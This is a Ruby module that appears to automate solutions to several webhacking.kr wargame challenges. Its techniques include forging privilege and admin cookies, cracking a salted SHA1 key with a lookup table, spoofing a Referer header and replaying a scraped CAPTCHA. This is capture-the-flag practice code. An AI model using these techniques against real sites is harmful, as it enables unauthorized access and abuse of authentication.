# frozen_string_literal: true

require 'digest'
require 'base64'

module WebhackingKR
  ##
  # Challenge base
  class ChallengeBase
    DATA_DIR = File.join(__dir__, '..', '..', 'data')

    @@successors = []

    class << self
      def inherited(subclass)
        super
        @@successors << subclass
      end

      def successors
        @@successors
      end
    end

    def initialize(shell, wargame, client)
      @shell = shell
      @wargame = wargame
      @client = client

      Dir.mkdir(data_dir) unless Dir.exist?(data_dir)
    end

    def exec; end

    ##
    # Prints a message
    def log(message)
      @shell.log("[challenge#{self.class::CHALLENGE}] #{message}")
    end

    def pwned
      log('Pwned!')
    end

    def failed(message = 'Failed!')
      log(message)
      false
    end

    def solved
      log('Already solved!')
    end

    ##
    # Checks if the challenge has been done
    def check(data)
      n = format('%02d', self.class::CHALLENGE)

      if data =~ /old-#{n} Pwned/
        pwned
        return true
      end

      if data =~ /already solved/
        solved
        return true
      end

      failed
    end

    ##
    # Returns the data directory
    def data_dir
      File.join(DATA_DIR, "challenge#{self.class::CHALLENGE}")
    end

    ##
    # Starts HTTP connection
    def start
      @client.start { yield if block_given? }
    end

    ##
    # Sends HTTP GET request
    def get(query, headers = {})
      cookie = headers['Cookie']
      headers['Cookie'] = @wargame.session_id
      headers['Cookie'] << "; #{cookie}" if cookie
      request = Net::HTTP::Get.new(query, headers)
      @client.request(request)
    end

    ##
    # Sends HTTP POST request
    def post(query, data = {}, headers = {})
      cookie = headers['Cookie']
      headers['Cookie'] = @wargame.session_id
      headers['Cookie'] << "; #{cookie}" if cookie
      request = Net::HTTP::Post.new(query, headers)
      request.set_form_data(data)
      @client.request(request)
    end
  end

  ##
  # Challenge 1
  class Challenge1 < ChallengeBase
    CHALLENGE = 1

    QUERY = '/challenge/web-01/'

    def exec
      log('Sending cookie')
      response = get(
        QUERY,
        { 'Cookie' => 'user_lv=3.5' }
      )
      check(response.body)
    end
  end

  ##
  # Challenge 4
  class Challenge4 < ChallengeBase
    CHALLENGE = 4

    QUERY = '/challenge/web-04/'
    SALT = 'salt_for_you'
    FROM = 10_000_000
    TO = 99_999_999
    INTERVAL = 300_000
    ROUNDS = 500
    TABLE_FILE = 'table.dat'
    HASH_LENGTH = 20

    def exec
      table_file = File.join(data_dir, TABLE_FILE)
      File.open(table_file, 'w').close unless File.exist?(table_file)
      table_size = File.size(table_file)
      table_size /= HASH_LENGTH
      file = File.open(table_file, 'r+b')
      file.seek(table_size * HASH_LENGTH)
      key = nil
      log("Lookup table: #{table_size} hashes")
      log('Generating lookup table and getting hashes')
      i = FROM + table_size
      loop do
        if (!i.zero? && (i % INTERVAL).zero?) || i >= TO
          file.rewind
          response = get(QUERY)
          match = %r(><b>([a-z0-9]{#{HASH_LENGTH * 2}})</b></td>).match(response.body)
          unless match
            failed
            break
          end
          @hash = match[1]
          log(@hash)
          @hash = [@hash].pack('H*')

          n = nil
          until file.eof?
            h = file.read(HASH_LENGTH)
            next unless h == @hash

            n = (file.pos - HASH_LENGTH) / HASH_LENGTH
            break
          end

          if n
            key = "#{n + FROM}#{SALT}"
            break
          end
        end

        h = "#{i}#{SALT}"
        file.write(hash(h))

        i += 1
        break if i > TO
      rescue Interrupt
        file.close
        return
      end

      file.close
      unless key
        failed('Key not found')
        return
      end

      log("Key found: #{key}")
      log('Submitting key')
      response = post(
        QUERY,
        { 'key' => key }
      )
      check(response.body)
    end

    private

    def hash(key)
      ROUNDS.times { key = Digest::SHA1.hexdigest(key) }
      [key].pack('H*')
    end
  end

  ##
  # Challenge 6
  class Challenge6 < ChallengeBase
    CHALLENGE = 6

    QUERY = '/challenge/web-06/'
    USER = 'admin'
    PASSWORD = 'nimda'
    ROUNDS = 20

    def exec
      user = encode(USER)
      password = encode(PASSWORD)
      log('Sending cookie')
      response = get(
        QUERY,
        { 'Cookie' => "user=#{user}; password=#{password}" }
      )
      check(response.body)
    end

    private

    def encode(data)
      ROUNDS.times { data = Base64.strict_encode64(data) }
      data.tr('12345678', '!@$^&*()')
    end

    def decode(data)
      ROUNDS.times { data = Base64.strict_decode64(data) }
      data.tr('!@$^&*()', '12345678')
    end
  end

  ##
  # Challenge 10
  class Challenge10 < ChallengeBase
    CHALLENGE = 10

    PATH = '/challenge/code-1/'
    QUERY = '?go='
    PIXEL = '1600px'

    def exec
      response = get(
        "#{PATH}#{QUERY}#{PIXEL}",
        { 'Referer' => "#{Wargame::BASE_URI}#{PATH}" }
      )
      check(response.body)
    end
  end

  ##
  # Challenge 19
  class Challenge19 < ChallengeBase
    CHALLENGE = 19

    QUERY = '/challenge/js-6/'
    LOGIN = 'admin'

    def exec
      userid = Base64.strict_encode64(encode(LOGIN))
      log('Sending cookie')
      response = get(
        QUERY,
        { 'Cookie' => "userid=#{userid}" }
      )
      check(response.body)
    end

    private

    def encode(login)
      login.chars.map { |c| Digest::MD5.hexdigest(c) }.join
    end
  end

  ##
  # Challenge 20
  class Challenge20 < ChallengeBase
    CHALLENGE = 20

    QUERY = '/challenge/code-4/'

    def exec
      start do
        log('Getting page')
        response = get(QUERY)
        match = /name=captcha_ value="([a-zA-Z0-9]{10})"/.match(response.body)
        failed unless match

        cookie = response['Set-Cookie'].split('; ')
        st = 0
        cookie.each do |c|
          w = c.split('=')
          next unless w[0] == 'st'

          st = w[1].to_i
          break
        end

        log("Server time: #{st}")
        log("Sending CAPTCHA: #{match[1]}")
        response = post(
          QUERY,
          {
            'id' => 'tester',
            'cmt' => 'comment',
            'captcha' => match[1]
          },
          { 'Cookie' => "st=#{st}" }
        )
        check(response.body)
      rescue Interrupt
        return
      end
    end
  end
end
